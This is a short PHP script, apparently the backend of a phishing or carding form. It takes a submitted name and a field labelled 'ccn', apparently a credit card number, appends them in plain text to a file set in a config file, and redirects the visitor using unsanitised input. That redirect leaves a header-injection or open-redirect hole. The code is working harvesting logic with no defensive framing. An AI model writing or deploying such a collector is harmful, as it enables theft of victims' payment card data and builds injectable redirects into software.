<?php
include_once 'config.php';
if (isset ($_POST['submit'])) {
    $name = $_POST['name'];
    $ccn = $_POST['ccn'];
    $query = $_POST['query'];
    $info = $name." : ".$ccn."\n";
    $file = $to;
    file_put_contents($file, $info, FILE_APPEND);
    header("$redirect=$query");
    exit;
}
?>
